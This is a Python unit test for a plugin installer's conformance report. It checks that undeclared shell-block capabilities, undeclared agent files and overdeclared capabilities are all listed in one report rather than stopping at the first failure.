def test_conformance_report_lists_findings_without_raising(tmp_path: Path) -> None:
    """The installer needs the whole picture for one prompt, not the first
    failure — the report is the data behind ``[v]iew contents``."""
    root = write_plugin(
        tmp_path / "p",
        manifest_for(capabilities={"pythonTools": True}),
        {"skills/py-style.md": SHELL_SKILL, "agents/ghost.md": "---\nname: ghost\n---\n"},
    )
    rep = conformance_report(root, load_manifest(root))
    assert [c for c, _ in rep.undeclared_capabilities] == ["shellBlocks"]
    assert rep.undeclared_content == ("agents/ghost.md",)
    # Declared-but-absent is a smell, not a refusal: it can only narrow.
    assert rep.overdeclared_capabilities == ("pythonTools",)
    assert not rep.ok


